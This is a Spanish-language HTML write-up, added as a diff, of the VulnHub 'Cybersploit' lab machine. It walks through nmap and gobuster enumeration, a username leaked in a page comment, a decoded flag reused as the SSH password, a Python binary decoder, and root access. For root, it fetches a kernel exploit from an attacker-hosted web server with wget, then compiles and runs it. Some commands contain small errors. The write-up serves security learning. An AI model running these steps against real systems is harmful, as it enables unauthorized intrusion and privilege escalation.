@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Writeup: Cybersploit</title>
+  <link rel="stylesheet" href="../styles.css" />
+  <style>
+    .code-block {
+      position: relative;
+      background: var(--bg-soft);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      margin: 1rem 0;
+    }
+    .code-block pre {
+      margin: 0;
+      padding: 0.75rem;
+      overflow-x: auto;
+    }
+    .copy-btn {
+      position: absolute;
+      top: 8px;
+      right: 8px;
+      background: var(--bg);
+      color: var(--accent);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 0.2rem 0.5rem;
+      font-size: 0.8rem;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+    .copy-btn:hover { background: rgba(64,255,156,0.1); }
+  </style>
+</head>
+<body>
+  <main class="container">
+    <section class="card">
+      <img src="img/cybers.png" alt="Máquina Cybersploit" class="machine-img"/>
+    </section>
+
+    <section class="card" style="text-align:center; margin-top:2rem;">
+      <button class="nav-btn" onclick="history.back()">⬅ Volver</button>
+      <button class="nav-btn" onclick="window.print()">⬇ Descargar PDF</button>
+      <button class="nav-btn" onclick="likePost()">👍 Me gusta <span id="like-count">0</span></button>
+    </section>
+
+    <section class="card">
+      <h2>Cybersploit</h2>
+      <p class="post-desc">Plataforma: VulnHub · Dificultad: Fácil · Fecha: Agosto 2026</p>
+      <ul class="post-tags">
+        <li>#vulnhub</li><li>#cybersploit</li><li>#ssh</li><li>#http</li>
+        <li>#enumeración</li><li>#fuzzing</li><li>#explotación</li><li>#python</li><li>#kernel</li>
+      </ul>
+    </section>
+
+    <section class="card">
+      <h3>Reconocimiento</h3>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>sudo arp-scan -I eth0 --localnet --ignoredups</code></pre>
+      </div>
+      <p>Resultado:</p>
+      <pre><code>192.168.1.103</code></pre>
+      <p>Una vez obtenida la <strong>IP</strong> vamos a realizar un reconocimiento para detectar puertos abiertos:</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>nmap -p-  192.168.1.103 -sS --min-rate 5000 -n -Pn -vvv -oG allPorts</code></pre>
+      </div>
+      <p>Resultado:</p>
+      <pre><code>22/tcp open  ssh     syn-ack ttl 64
+80/tcp open  http    syn-ack ttl 64</code></pre>
+      <p>Tenemos 2 puertos abiertos. Vamos a realizar un escaneo más exhaustivo para obtener más información de los servicios que están corriendo:</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>nmap -p22,80 192.168.1.103 -sCV -oN targeted</code></pre>
+      </div>
+      <p>En este escaneo no encontramos ninguna relevante. Tener en cuenta que con la cabecera de <code>SSH</code> se puede obtener el codename del SO. Esto es solo informativo, no sirve para nada en la explotación del sistema.</p>
+    </section>
+
+    <section class="card">
+      <h3>Enumeración</h3>
+      <p>Ahora vamos a visitar la web y ver qué podemos enumerar para realizar la explotación:</p>
+      <section class="card">
+            <img src="img/cs.png" alt="web_cyber" class="machine-img"/>
+      </section>
+      <p>Como se ve en la imagen, en esta web no se visualiza nada interesante más allá de un mensaje dejado por algún tipo de hacker, pero si investigas en el código de la web:</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>CTRL + U</code></pre>
+      </div>
+      <p>Podemos ver en una de las últimas secciones el siguiente comentario:</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>&lt;!-------------username:itsskv---------------------&gt;</code></pre>
+      </div>
+      <p>Este comentario nos revela un nombre de usuario el cual puede ser un usuario del sistema que nos permita acceder al sistema por <code>SSH</code>. Por ahora nos quedamos con este <code>username</code>.</p>
+      <p>Después de seguir viendo el código fuente no encontré nada más interesante, por lo que decidí aplicar <code>fuzzing</code> a nivel de rutas para encontrar directorios y archivos de la web, usando la herramienta #gobuster.</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>gobuster dir -u http://192.168.1.103 -w /usr/share/wordlist/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,txt,jpeg,gif,jpg,html</code></pre>
+      </div>
+      <p>Se encontraron varias rutas:</p>
+      <pre><code>/robots.txt
+/hacker.gif</code></pre>
+      <p>Donde el archivo <code>robots.txt</code> contenía la primera flag:</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>echo &quot;R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9&quot; | base -d
+
+Good Work !
+Flag1: cybersploit{youtube.com/c/cybersploit}</code></pre>
+      </div>
+    </section>
+
+    <section class="card">
+      <h3>Newlerning</h3>
+      <p>Y aquí viene una de las habilidades y costumbres que todo hacker debería tener, que es <strong>imaginación y probar todas las posibilidades</strong>.</p>
+      <p>¿Y por qué digo esto?, porque al obtener esta <code>flag</code> solo la tomé como una flag, no le di mayor importancia, así que seguí enumerando la máquina en busca de vectores de ataque, pero no encontraba nada. Probé la #esteganografia en el gif, pero nada. A pesar de ser una máquina de dificultad fácil me estaba rindiendo ya que no encontraba nada, y tal vez piensen que era muy fácil darse cuenta de la situación, pero para mí no lo fue, hasta que después de muchas horas buscando decidí buscar ayuda en internet. En un writeup de la web llamada <strong>Medium</strong>, vi que la <code>flag</code> se usa como password para el usuario <code>itsskv</code> en SSH, o sea, es la password de este usuario, cosa que me decepcionó un poco, pero rápido lo tomé como una nueva enseñanza <strong>Probar Todas las Posibilidades</strong>:</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>ssh itsskv@192.168.1.103</code></pre>
+      </div>
+      <p>Al ingresar la flag como password e ingresar sentí que la victoria no era mía, pero seguí adelante, con energías renovadas para enumerar el sistema y poder escalar privilegios.</p>
+      <p>La flag en este caso <code>flag2</code> son unas cadenas en binario:</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010 01101011 00100000 00100001 00001010 01100110 01101100 01100001 01100111 00110010 00111010 00100000 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 01111011 01101000 01110100 01110100 01110000 01110011 00111010 01110100 00101110 01101101 01100101 00101111 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 00110001 01111101</code></pre>
+      </div>
+      <p>Creé un script para hacer esta tarea. Sé que hay muchas herramientas y librerías en Python que pueden hacerlo fácilmente, pero para practicar un poco de Python hice uno como mejor pude:</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>#!/usr/bin/python3
+
+import time
+
+def extract_info():
+
+with open(&quot;data&quot; , &quot;r&quot;) as f:
+
+data = f.read()
+
+list_bits = data.strip().split(&quot; &quot;)
+
+#print(list_bits)
+
+return list_bits
+
+
+def convert(lista_bits):
+
+values = [1,2,4,8,16,32,64,128]
+
+all_values = []
+
+for lista in lista_bits: # 11100110 = 103
+
+lista = lista[::-1]
+
+#print(lista)
+
+cont = 0
+
+decimal = 0
+
+for i in range(0,8): # 0
+
+for b in lista: # 01
+
+if b == &quot;0&quot;:
+
+cont+=1
+
+else: # Si b = 1
+
+if cont == 0:
+
+decimal += values[0]
+
+cont+=1
+
+else:
+
+decimal += values[cont]
+
+cont+=1
+
+#print(decimal)
+
+#time.sleep(1)
+
+print(f&quot;\nValues Decimal -&gt; {decimal}&quot;)
+
+all_values.append(decimal)
+
+break
+
+return all_values
+
+
+def convert_to_ascii(all_values):
+
+char = &quot;&quot;.join(chr(x) for x in all_values) # chr -&gt; convierte una decimal a su caracter correspondiente en la tabla ascii3
+
+print(char)
+
+def main():
+
+list_bits = extract_info()
+
+all_values = convert(list_bits)
+
+convert_to_ascii(all_values)
+
+
+#for decimal in all_values:
+
+#print(f&quot;\nValues Decimal the [{bits}] -&gt; {decimal}&quot;)
+
+if __name__ == &quot;__main__&quot;:
+
+main()</code></pre>
+      </div>
+      <pre><code>flag2: cybersploit{https:t.me/cybersploit1}</code></pre>
+      <p>Para ver la flag tienes que convertir esa cadena en decimal y una vez convertida ver los valores en <code>ASCII</code> de cada uno de los números representados.</p>
+      <p>La enumeración de este no fue mucho más sencilla, probé todas las técnicas que conocía y tampoco encontraba el camino, pero en este caso probé algo básico que no había probado hasta el momento que lo leí en una de mis notas: <strong>la versión del kernel</strong>, sí, ya sé, lo básico de lo básico en escalada de privilegios.</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>uname -a
+
+3.13.0-32-generic</code></pre>
+      </div>
+    </section>
+
+    <section class="card">
+      <h3>Explotación</h3>
+      <p>Al ver esta versión y buscar en el navegador de confianza encontré que para esta versión de <code>kernel</code> había diferentes <code>exploit</code> que te daban ciertos privilegios, entre ellos uno que te proporcionaba una consola interactiva. No lo pongo aquí para que hagan la búsqueda por ustedes mismos ;).</p>
+      <p>Una vez encontrado el exploit programado en C lo descargué, y con <code>python3</code> inicié un servicio web desde la máquina atacante para desde la máquina víctima poder descargarlo y ejecutarlo:</p>
+      <p><strong>Atacante:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>python3 -m http.server 8000</code></pre>
+      </div>
+      <p><strong>Víctima:</strong></p>
+      <p>Comprobamos que esté <code>wget</code>:</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>which wget</code></pre>
+      </div>
+      <p>Resultado:</p>
+      <pre><code>/usr/bin/wget</code></pre>
+      <p>Y sí está, por lo que podemos traernos el <code>exploit</code>:</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>wget &quot;http://192.168.1.103:8000/37292.c&quot;</code></pre>
+      </div>
+      <p>Una vez traído el script a la máquina víctima queda compilarlo:</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>gcc 37292.c -o exploit</code></pre>
+      </div>
+      <p>Lo ejecutamos y listo, tenemos una consola interactiva como root.</p>
+      <pre><code>flag3: cybersploit{Z3X21CW42C4 many many congratulations !}</code></pre>
+    </section>
+
+<script>
+  let likes = parseInt(localStorage.getItem("likes") || "0");
+  document.getElementById("like-count").textContent = likes;
+  function likePost() {
+    likes++;
+    document.getElementById("like-count").textContent = likes;
+    localStorage.setItem("likes", likes);
+  }
+  function copyCode(btn) {
+    const code = btn.parentElement.querySelector("code").innerText;
+    navigator.clipboard.writeText(code);
+    btn.textContent = "Copiado";
+    setTimeout(() => btn.textContent = "Copiar", 1200);
+  }
+</script>
+
+<section class="card" style="margin-top:2rem;">
+  <h3>Comentarios</h3>
+  <textarea id="comment-input" placeholder="Escribe tu comentario..." class="comment-box"></textarea>
+  <br/><br/>
+  <button class="nav-btn" onclick="addComment()">Enviar comentario</button>
+  <ul id="comment-list" style="margin-top:1rem; text-align:left;"></ul>
+</section>
+
+<script>
+  function addComment() {
+    const input = document.getElementById("comment-input");
+    const text = input.value.trim();
+    if(text !== "") {
+      const li = document.createElement("li");
+      li.textContent = text;
+      document.getElementById("comment-list").appendChild(li);
+      let comments = JSON.parse(localStorage.getItem("comments") || "[]");
+      comments.push(text);
+      localStorage.setItem("comments", JSON.stringify(comments));
+      input.value = "";
+    }
+  }
+  window.onload = () => {
+    const savedComments = JSON.parse(localStorage.getItem("comments") || "[]");
+    savedComments.forEach(c => {
+      const li = document.createElement("li");
+      li.textContent = c;
+      document.getElementById("comment-list").appendChild(li);
+    });
+  }
+</script>
+  </main>
+</body>
+</html>
